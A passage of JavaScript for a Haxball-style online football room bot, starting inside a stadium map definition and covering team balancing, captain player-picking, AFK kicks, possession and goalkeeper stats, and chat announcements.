"rede","bias":0,"x":-750},{"v0":106,"v1":107,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-750},{"v0":108,"v1":109,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-750},{"v0":110,"v1":111,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-750},{"v0":112,"v1":113,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-750},{"v0":114,"v1":115,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":750},{"v0":116,"v1":117,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":750},{"v0":118,"v1":119,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":750},{"v0":120,"v1":121,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":750},{"v0":122,"v1":123,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":750},{"v0":124,"v1":125,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-490,"y":90},{"v0":126,"v1":127,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-490,"y":-90},{"v0":128,"v1":129,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-490,"y":90},{"v0":130,"v1":131,"vis":true,"color":"247BE3","bCoef":1.3,"cMask":["wall"],"trait":"rede","bias":0,"x":-490,"y":-90},{"v0":132,"v1":133,"curve":-90,"color":"717171","trait":"linha","y":150,"x":-700},{"v0":134,"v1":135,"curve":90,"color":"717171","trait":"linha","y":150,"x":700},{"v0":138,"v1":139,"color":"FBE37D","cMask":["wall"],"cGroup":["wall"],"y":87},{"v0":140,"v1":141,"curve":-10,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":142,"v1":143,"curve":-10,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":146,"v1":147,"curve":0,"color":"F7DC6F","cMask":["wall"],"cGroup":["wall"],"y":87},{"v0":148,"v1":149,"curve":-5,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":150,"v1":151,"curve":9,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":152,"v1":153,"curve":-7,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":154,"v1":155,"curve":9.971862000782721,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":156,"v1":157,"curve":-30.255631412293944,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"],"y":110},{"v0":158,"v1":159,"curve":-35.344670176935146,"color":"239B56","cMask":["wall"],"cGroup":["wall"],"y":66},{"v0":160,"v1":161,"curve":-35.34467017693518,"color":"239B56","cMask":["wall"],"cGroup":["wall"],"y":63},{"v0":162,"v1":163,"curve":-35.34467017693502,"color":"1E8449","cMask":["wall"],"cGroup":["wall"],"y":60},{"v0":166,"v1":167,"curve":-10,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":168,"v1":169,"curve":20,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":170,"v1":171,"curve":19.980617854376742,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":172,"v1":173,"curve":19.825378294386724,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":173,"v1":174,"curve":20.095207626974666,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":171,"v1":175,"curve":19.83082240294392,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":175,"v1":176,"curve":19.870013082058666,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":176,"v1":177,"curve":20.056605062337646,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":177,"v1":178,"curve":19.824043161727953,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":174,"v1":179,"curve":19.87890896829948,"color":"F7DC6F","cMask":["wall"],"cGroup":["wall"]},{"v0":179,"v1":180,"curve":19.968942406277453,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":181,"v1":182,"curve":40.25099341278321,"vis":true,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":182,"v1":183,"curve":39.6593065347139,"vis":true,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":183,"v1":184,"curve":30.257096492338828,"vis":true,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":185,"v1":186,"curve":-35.34467017693512,"color":"239B56","cMask":["wall"],"cGroup":["wall"],"y":69},{"v0":187,"v1":188,"curve":-35.34467017693499,"color":"28B463","cMask":["wall"],"cGroup":["wall"],"y":72},{"v0":189,"v1":190,"curve":-36,"color":"28B463","cMask":["wall"],"cGroup":["wall"],"y":75},{"v0":191,"v1":192,"curve":10,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":193,"v1":194,"curve":-185,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"],"x":-245},{"v0":195,"v1":196,"curve":-187,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"],"x":-245},{"v0":197,"v1":198,"curve":0,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":199,"v1":200,"curve":-6,"color":"F7DC6F","cMask":["wall"],"cGroup":["wall"]},{"v0":201,"v1":202,"curve":25,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":203,"v1":204,"curve":-7,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":205,"v1":206,"curve":-30.255631412293944,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"],"y":110},{"v0":207,"v1":208,"curve":65,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"],"y":48},{"v0":209,"v1":210,"curve":0,"color":"D4AC0D","cMask":["wall"],"cGroup":["wall"]},{"v0":211,"v1":212,"curve":-2,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"]},{"v0":213,"v1":214,"curve":-10,"color":"F4D03F","cMask":["wall"],"cGroup":["wall"]},{"v0":215,"v1":216,"curve":187,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"],"x":-245},{"v0":217,"v1":218,"curve":185,"color":"F1C40F","cMask":["wall"],"cGroup":["wall"],"x":-245},{"v0":219,"v1":220,"curve":3.3354726766396428,"color":"FFFFFF","bCoef":0.1,"cMask":["wall"],"cGroup":["redKO","blueKO"]},{"v0":221,"v1":222,"curve":180.34830935060117,"color":"FFFFFF","bCoef":0.1,"cMask":["wall"],"cGroup":["redKO","blueKO"]},{"v0":223,"v1":224,"curve":-112.01006530416386,"color":"FFFFFF","bCoef":0.1,"cMask":["wall"],"cGroup":["redKO","blueKO"]},{"v0":225,"v1":226,"curve":-164.5409479979574,"color":"FFFFFF","bCoef":0.1,"cMask":["wall"],"cGroup":["redKO","blueKO"]},{"v0":225,"v1":227,"curve":6.249175943120465,"color":"FFFFFF","cMask":["wall"]},{"v0":226,"v1":228,"curve":-123.41048974700357,"color":"FFFFFF","cMask":["wall"]},{"v0":229,"v1":230,"curve":-5.0801638679967285,"color":"FFFFFF","cMask":["wall"]},{"v0":231,"v1":232,"curve":-5.832108701461828,"color":"FFFFFF","cMask":["wall"]},{"v0":233,"v1":234,"curve":-107.1578018849103,"color":"FFFFFF","cMask":["wall"]},{"v0":234,"v1":235,"curve":-9.567778429804825,"color":"FFFFFF","cMask":["wall"]},{"v0":236,"v1":237,"curve":-164.54094799796243,"color":"FFFFFF","bCoef":0.1,"cMask":["wall"],"cGroup":["redKO","blueKO"]},{"v0":236,"v1":238,"curve":6.249175943120352,"color":"FFFFFF","cMask":["wall"]},{"v0":237,"v1":239,"curve":-123.41048974700553,"color":"FFFFFF","cMask":["wall"]},{"v0":240,"v1":241,"color":"FFFFFF","cMask":["wall"]},{"v0":242,"v1":243,"curve":-70.6842360982381,"color":"FFFFFF","cMask":["wall"]}],"goals":[{"p0":[-708.25,-90],"p1":[-708.25,90],"team":"red"},{"p0":[708.25,90],"p1":[708.25,-90],"team":"blue"}],"discs":[{"radius":6.25,"invMass":1.5,"pos":[0,0],"color":"ffffff","bCoef":0.4,"cGroup":["ball","kick","score"]},{"radius":5,"pos":[-700,90],"color":"D60000","trait":"traveRed"},{"radius":5,"pos":[-700,-90],"color":"D60000","trait":"traveRed"},{"radius":5,"pos":[700,90],"color":"247BE3","trait":"traveBlue"},{"radius":5,"pos":[700,-90],"color":"247BE3","trait":"traveBlue"},{"pos":[-700,320],"color":"969EA8","trait":"bandeiraRed"},{"pos":[-700,-320],"color":"969EA8","trait":"bandeiraRed"},{"pos":[700,320],"color":"969EA8","trait":"bandeiraBlue"},{"pos":[700,-320],"color":"969EA8","trait":"bandeiraBlue"}],"planes":[{"normal":[0,1],"dist":-350,"cMask":["red","blue","ball"],"color":"969EA8","_data":{"extremes":{"normal":[0,1],"dist":-350,"canvas_rect":[-850,-350,850,350],"a":[-850,-350],"b":[850,-350]}}},{"normal":[1,0],"dist":-780,"cMask":["red","blue","ball"],"color":"969EA8","_data":{"extremes":{"normal":[1,0],"dist":-780,"canvas_rect":[-850,-350,850,350],"a":[-780,-350],"b":[-780,350]}}},{"normal":[0,-1],"dist":-350,"cMask":["red","blue","ball"],"color":"969EA8","_data":{"extremes":{"normal":[0,-1],"dist":-350,"canvas_rect":[-850,-350,850,350],"a":[-850,350],"b":[850,350]}}},{"normal":[-1,0],"dist":-780,"cMask":["red","blue","ball"],"color":"969EA8","_data":{"extremes":{"normal":[-1,0],"dist":-780,"canvas_rect":[-850,-350,850,350],"a":[780,-350],"b":[780,350]}}}],"traits":{"rede":{"vis":true,"bCoef":0.1,"cMask":["ball","red","blue"],"color":"F2F2F2"},"rede2":{"vis":false,"bCoef":0.1,"cMask":["ball"],"color":"F2F2F2"},"parede":{"vis":false,"bCoef":1,"cMask":["ball"],"bias":10},"traveRed":{"radius":6,"invMass":0,"bCoef":0.5,"color":"E18977"},"traveBlue":{"radius":6,"invMass":0,"bCoef":0.5,"color":"85ACF3"},"bandeiraRed":{"radius":3,"color":"E18977","cMask":[""]},"bandeiraBlue":{"radius":3,"color":"85ACF3","cMask":[""]},"linha":{"cMask":[""],"color":"F2F2F2"},"hb":{"cMask":[""],"color":"F2F2F2"}},"ballPhysics":"disc0","playerPhysics":{"bCoef":0,"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":4.95},"joints":[],"redSpawnPoints":[[-530,0],[-135,90],[-135,-90],[-285,0],[-765,0]],"blueSpawnPoints":[[530,0],[135,90],[135,-90],[285,0],[765,0]]}'; // Read above

/* OPTIONS */

var afkLimit = 12;
var drawTimeLimit = Infinity;
var maxTeamSize = 4; // This works for 1 (you might want to adapt things to remove some useless stats in 1v1 like assist or cs), 2, 3 or 4
var slowMode = 0;

/* PLAYERS */

const Team = { SPECTATORS: 0, RED: 1, BLUE: 2 };
var extendedP = [];
const eP = { ID: 0, AUTH: 1, CONN: 2, AFK: 3, ACT: 4, GK: 5, MUTE: 6 };
const Ss = { GA: 0, WI: 1, DR: 2, LS: 3, WR: 4, GL: 5, AS: 6, GK: 7, CS: 8, CP: 9, RL: 10, NK: 11}
var players;
var teamR;
var teamB;
var teamS;

/* GAME */

var lastTeamTouched;
var lastPlayersTouched; // These allow to get good goal notifications (it should be lastPlayersKicked, waiting on a next update to get better track of shots on target)
var countAFK = false; // Created to get better track of activity
var activePlay = false; // Created to get better track of the possession
var goldenGoal = false;
var SMSet = new Set(); // Set created to get slow mode which is useful in chooseMode
var banList = []; // Getting track of the bans, so we can unban ppl if we want

/* STATS */

var game;
var GKList = ["",""];
var Rposs = 0;
var Bposs = 0;
var point = [{"x": 0, "y": 0}, {"x": 0, "y": 0}]; // created to get ball speed
var ballSpeed;
var vcgbsdbf = 7865;
var lastWinner = Team.SPECTATORS;
var streak = 0;
var allBlues = []; // This is to count the players who should be counted for the stats. This includes players who left after the game has started, doesn't include those who came too late or ...
var allReds = []; // ... those who came in a very unequal game.

/* BALANCE & CHOOSE */

var inChooseMode = false; // This variable enables to distinguish the 2 phases of playing and choosing which should be dealt with very differently
var redCaptainChoice = "";
var blueCaptainChoice = "";
var chooseTime = 20;
var timeOutCap;

/* AUXILIARY */

var checkTimeVariable = false; // This is created so the chat doesn't get spammed when a game is ending via timeLimit
var statNumber = 0; // This allows the room to be given stat information every X minutes
var endGameVariable = false; // This variable with the one below helps distinguish the cases where games are stopped because they have finished to the ones where games are stopped due to player movements or resetting teams
var resettingTeams = false;
var capLeft = false;
var statInterval = 6;

loadMap(aloneMap, 0, 0);

/* OBJECTS */

function Goal(time, team, striker, assist) {
	this.time = time;
	this.team = team;
	this.striker = striker;
	this.assist = assist;
}

function Game(date, scores, goals) {
	this.date = date;
	this.scores = scores;
	this.goals = goals;
}

/* FUNCTIONS */

/* AUXILIARY FUNCTIONS */

function getRandomInt(max) { // returns a random number from 0 to max-1
	return Math.floor(Math.random() * Math.floor(max)); 
}

function getTime(scores) { // returns the current time of the game
	return "[" + Math.floor(Math.floor(scores.time/60)/10).toString() + Math.floor(Math.floor(scores.time/60)%10).toString() + ":" + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))/10).toString() + Math.floor(Math.floor(scores.time - (Math.floor(scores.time/60) * 60))%10).toString() + "]"
}

function pointDistance(p1, p2) {
	var d1 = p1.x - p2.x;
	var d2 = p1.y - p2.y;
	return Math.sqrt(d1 * d1 + d2 * d2);
}

/* BUTTONS */

function topBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				room.setPlayerTeam(teamS[0].id, Team.RED);
				room.setPlayerTeam(teamS[1].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[0].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[0].id, Team.BLUE);
		}
	}
}

function randomBtn() {
	if (teamS.length == 0) {
		return;
	}
	else {
		if (teamR.length == teamB.length) {
			if (teamS.length > 1) {
				var r = getRandomInt(teamS.length);
				room.setPlayerTeam(teamS[r].id, Team.RED);
				teamS = teamS.filter((spec) => spec.id != teamS[r].id);
				room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
			}
			return;
		}
		else if (teamR.length < teamB.length) {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED);
		}
		else {
			room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE);
		}
	}
}

function blueToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
	}
}

function redToSpecBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamR.length; i++) {
		room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
	}
}

function resetBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	if (teamR.length <= teamB.length) {
		for (var i = 0; i < teamR.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamR.length; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
		}
	}
	else {
		for (var i = 0; i < teamB.length; i++) {
			room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
		for (var i = teamB.length; i < teamR.length; i++) {
			room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
		}
	}
}

function blueToRedBtn() {
	resettingTeams = true;
	setTimeout(() => { resettingTeams = false; }, 100);
	for (var i = 0; i < teamB.length; i++) {
		room.setPlayerTeam(teamB[i].id, Team.RED);
	}
}

/* GAME FUNCTIONS */

function checkTime() {
	const scores = room.getScores();
	game.scores = scores;
	if (Math.abs(scores.time - scores.timeLimit) <= 0.01 && scores.timeLimit != 0) {
		if (scores.red != scores.blue) {
			if (checkTimeVariable == false) {
				checkTimeVariable = true;
				setTimeout(() => { checkTimeVariable = false; }, 3000);
				scores.red > scores.blue ? endGame(Team.RED) : endGame(Team.BLUE);
				setTimeout(() => { room.stopGame(); }, 2000);
			}
			return;
		}
		goldenGoal = true;
		room.sendChat("⚽ First goal wins !");
	}
	if (Math.abs(drawTimeLimit * 60 - scores.time - 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			room.sendChat("⌛ 60 seconds left until draw !");
		}
	}
	if (Math.abs(scores.time - drawTimeLimit * 60) <= 0.01 && players.length > 2) {
		if (checkTimeVariable == false) {
			checkTimeVariable = true;
			setTimeout(() => { checkTimeVariable = false; }, 10);
			endGame(Team.SPECTATORS);
			room.stopGame();
			goldenGoal = false;
		}
	}
}

function endGame(winner) { // handles the end of a game : no stopGame function inside
	players.length >= 2 * maxTeamSize - 1 ? activateChooseMode() : null;
	const scores = room.getScores();
	game.scores = scores;
	Rposs = Rposs/(Rposs+Bposs);
	Bposs = 1 - Rposs;
	lastWinner = winner;
	endGameVariable = true;
	if (winner == Team.RED) {
		streak++;
		room.sendChat("🔴 Red Team won " + scores.red + "-" + scores.blue + " ! Current streak : " + streak + " 🏆");
	}
	else if (winner == Team.BLUE) {
		streak = 1;
		room.sendChat("🔵 Blue Team won " + scores.blue + "-" + scores.red + " ! Current streak : " + streak + " 🏆");
	}
	else {
		streak = 0;
		room.sendChat("💤 Draw limit reached! 💤");
    }
    room.sendChat("⭐ Possession : 🔴 " + (Rposs*100).toPrecision(3).toString() + "% : " + (Bposs*100).toPrecision(3).toString() + "% 🔵");
    scores.red == 0 ? (scores.blue == 0 ? room.sendChat("🏆 " + GKList[0].name + " and " + GKList[1].name + " kept a CS ! ") : room.sendChat("🏆 " + GKList[1].name + " kept a CS ! ")) : scores.blue == 0 ? room.sendChat("🏆 " + GKList[0].name + " kept a CS ! ") : null;
	updateStats();
}

function quickRestart() {
	room.stopGame();
	setTimeout(() => { room.startGame(); }, 2000);
}

function resumeGame() {
	setTimeout(() => { room.startGame(); }, 2000);
	setTimeout(() => { room.pauseGame(false); }, 1000);
}

function activateChooseMode() {
	inChooseMode = true;
	slowMode = 2;
	room.sendChat("2 seconds slow mode enabled !");
}

function deactivateChooseMode() {
	inChooseMode = false;
	clearTimeout(timeOutCap);
	if (slowMode != 0) {
		slowMode = 0;
		room.sendChat("Slow mode terminated.");
	}
	redCaptainChoice = "";
	blueCaptainChoice = "";
}

function loadMap(map, scoreLim, timeLim) {
	if (map == aloneMap) {
		room.setCustomStadium(aloneMap);
	}
	else if (map == classicMap) {
		(classicMap != '') ? room.setCustomStadium(classicMap) : room.setDefaultStadium("Classic");
	}
	else if (map == bigMap) {
		(bigMap != '.') ? room.setCustomStadium(bigMap) : room.setDefaultStadium("Big");
	}
	else {
		room.setCustomStadium(map);
	}
	room.setScoreLimit(scoreLim);
	room.setTimeLimit(timeLim);
}

/* PLAYER FUNCTIONS */

function updateTeams() { // update the players' list and all the teams' list
	players = room.getPlayerList().filter((player) => player.id != 0 && !getAFK(player));
	teamR = players.filter(p => p.team === Team.RED);
	teamB = players.filter(p => p.team === Team.BLUE);
	teamS = players.filter(p => p.team === Team.SPECTATORS);
}

function handleInactivity() { // handles inactivity : players will be kicked after afkLimit
	if (countAFK && (teamR.length + teamB.length) > 1) {
		for (var i = 0; i < teamR.length ; i++) {
			setActivity(teamR[i], getActivity(teamR[i]) + 1);
		}
		for (var i = 0; i < teamB.length ; i++) {
			setActivity(teamB[i], getActivity(teamB[i]) + 1);
		}
	}
	for (var i = 0; i < extendedP.length ; i++) {
		if (extendedP[i][eP.ACT] == 60 * (2/3 * afkLimit)) {
			room.sendChat("[PV] ⛔ @" + room.getPlayer(extendedP[i][eP.ID]).name + ", if you don't move or send a message in the next " + Math.floor(afkLimit / 3) + " seconds, you will be kicked !", extendedP[i][eP.ID]);
		}
		if (extendedP[i][eP.ACT] >= 60 * afkLimit) {
			extendedP[i][eP.ACT] = 0;
            if (room.getScores().time <= afkLimit - 0.5) {
				setTimeout(() => { !inChooseMode ? quickRestart() : room.stopGame(); }, 10);
			}
			room.kickPlayer(extendedP[i][eP.ID], "AFK", false);
		}
	}
}

function getAuth(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AUTH] : null;
}

function getAFK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.AFK] : null;
}

function setAFK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.AFK] = value);
}

function getActivity(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.ACT] : null;
}

function setActivity(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.ACT] = value);
}

function getGK(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.GK] : null;
}

function setGK(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.GK] = value);
}

function getMute(player) {
	return extendedP.filter((a) => a[0] == player.id) != null ? extendedP.filter((a) => a[0] == player.id)[0][eP.MUTE] : null;
}

function setMute(player, value) {
	extendedP.filter((a) => a[0] == player.id).forEach((player) => player[eP.MUTE] = value);
}

/* BALANCE & CHOOSE FUNCTIONS */

function updateRoleOnPlayerIn() {
	updateTeams();
	if (inChooseMode) {
		if (players.length == 6) {
			loadMap(bigMap, scoreLimitBig, timeLimitBig);
		}
		getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function updateRoleOnPlayerOut() {
    updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (players.length >= 2 * maxTeamSize && scores.time >= (5/6) * game.scores.timeLimit && teamR.length != teamB.length) {
			if (teamR.length < teamB.length) {
				if (scores.blue - scores.red == 2) {
					endGame(Team.BLUE);
					room.sendChat("🤖 Ragequit detected. Game ended 🤖");
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
			else {
				if (scores.red - scores.blue == 2) {
					endGame(Team.RED);
					room.sendChat("🤖 Ragequit detected. Game ended 🤖");
					setTimeout(() => { room.stopGame(); }, 100);
					return;
				}
			}
		}
	}
	if (inChooseMode) {
		if (players.length == 5) {
			loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
		}
		if (teamR.length == 0 || teamB.length == 0) {
			teamR.length == 0 ? room.setPlayerTeam(teamS[0].id, Team.RED) : room.setPlayerTeam(teamS[0].id, Team.BLUE);
			return;
		}
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			room.sendChat("🤖 No choices left, let me handle this situation... 🤖");
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 5*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 5*i);
				}
			}
			return;
		}
		if (streak == 0 && room.getScores() == null) {
			if (Math.abs(teamR.length - teamB.length) == 2) { // if someone left a team has 2 more players than the other one, put the last chosen guy back in his place so it's fair
				room.sendChat("🤖 Balancing teams... 🤖");
				teamR.length > teamB.length ? room.setPlayerTeam(teamR[teamR.length - 1].id, Team.SPECTATORS) : room.setPlayerTeam(teamB[teamB.length - 1].id, Team.SPECTATORS);
			}
		}
		if (teamR.length == teamB.length && teamS.length < 2) {
			deactivateChooseMode();
			resumeGame();
			return;
		}
		capLeft ? choosePlayer() : getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
	}
	balanceTeams();
}

function balanceTeams() {
	if (!inChooseMode) {
		if (players.length == 1 && teamR.length == 0) {
            quickRestart();
            loadMap(aloneMap, 0, 0);
			room.setPlayerTeam(players[0].id, Team.RED);
		}
		else if (Math.abs(teamR.length - teamB.length) == teamS.length && teamS.length > 0) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 2) {
				quickRestart();
				loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.BLUE);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.RED);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) > teamS.length) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 1) {
				quickRestart();
				loadMap(aloneMap, 0, 0);
				room.setPlayerTeam(players[0].id, Team.RED);
				return;
			}
			else if (players.length == 5) {
				quickRestart();
				loadMap(classicMap, scoreLimitClassic, timeLimitClassic);
			}
			if (players.length == maxTeamSize * 2 - 1) {
				allReds = [];
				allBlues = [];
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) < teamS.length && teamR.length != teamB.length) {
			room.pauseGame(true);
			activateChooseMode();
			choosePlayer();
		}
		else if (teamS.length >= 2 && teamR.length == teamB.length && teamR.length < maxTeamSize) {
			if (teamR.length == 2) {
				quickRestart();
				loadMap(bigMap, scoreLimitBig, timeLimitBig);
			}
			topBtn();
		}
	}
}

function choosePlayer() {
	clearTimeout(timeOutCap);
	if (teamR.length <= teamB.length && teamR.length != 0) {
		room.sendChat("[PV] To choose a player, enter his number in the list given or use 'top', 'random' or 'bottom'.", teamR[0].id);
		timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Hurry up @" + player.name + ", only " + Number.parseInt(chooseTime / 2) + " seconds left to choose !", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "You didn't choose in time !", false); }, chooseTime * 500, teamR[0]); }, chooseTime * 1000, teamR[0]);
	}
	else if (teamB.length < teamR.length && teamB.length != 0) {
		room.sendChat("[PV] To choose a player, enter his number in the list given or use 'top', 'random' or 'bottom'.", teamB[0].id);
		timeOutCap = setTimeout(function (player) { room.sendChat("[PV] Hurry up @" + player.name + ", only " + Number.parseInt(chooseTime / 2) + " seconds left to choose !", player.id); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "You didn't choose in time !", false); }, chooseTime * 500, teamB[0]); }, chooseTime * 1000, teamB[0]);
	}
	if (teamR.length != 0 && teamB.length != 0) getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
}

function getSpecList(player) {
	var cstm = "[PV] Players : ";
	for (var i = 0 ; i < teamS.length ; i++) {
		if (140 - cstm.length < (teamS[i].name + "[" + (i+1) + "], ").length) {
			room.sendChat(cstm, player.id);
			cstm = "... ";
		}
		cstm += teamS[i].name + "[" + (i+1) + "], ";
	}
	cstm = cstm.substring(0,cstm.length - 2);
	cstm += ".";
	room.sendChat(cstm, player.id);
}

/* STATS FUNCTIONS */

function getLastTouchOfTheBall() {
	const ballPosition = room.getBallPosition();
	updateTeams();
	for (var i = 0; i < players.length; i++) {
		if (players[i].position != null) {
			var distanceToBall = pointDistance(players[i].position, ballPosition);
			if (distanceToBall < triggerDistance) {
				!activePlay ? activePlay = true : null;
				if (lastTeamTouched == players[i].team && lastPlayersTouched[0] != null && lastPlayersTouched[0].id != players[i].id) {
					lastPlayersTouched[1] = lastPlayersTouched[0];
					lastPlayersTouched[0] = players[i];
				}
				lastTeamTouched = players[i].team;
			}
		}
	}
}

function getStats() { // gives possession, ball speed and GK of each team
	if (activePlay) {
		updateTeams();
		lastTeamTouched == Team.RED ? Rposs++ : Bposs++;
		var ballPosition = room.getBallPosition();
		point[1] = point[0];
		point[0] = ballPosition;
		ballSpeed = (pointDistance(point[0], point[1]) * 60 * 60 * 60)/15000;
		var k = [-1, Infinity];
		for (var i = 0; i < teamR.length; i++) {
			if (teamR[i].position.x < k[1]) {
				k[0] = teamR[i];
				k[1] = teamR[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		k = [-1, -Infinity];
		for (var i = 0; i < teamB.length; i++) {
			if (teamB[i].position.x > k[1]) {
				k[0] = teamB[i];
				k[1] = teamB[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		findGK();
	}
}

function updateStats() {
	if (players.length >= 2 * maxTeamSize && (game.scores.time >= (5 / 6) * game.scores.timeLimit || game.scores.red == game.scores.scoreLimit || game.scores.blue == game.scores.scoreLimit) && allReds.length >= maxTeamSize && allBlues.length >= maxTeamSize) {
		var stats;
		for (var i = 0; i < allReds.length; i++) {
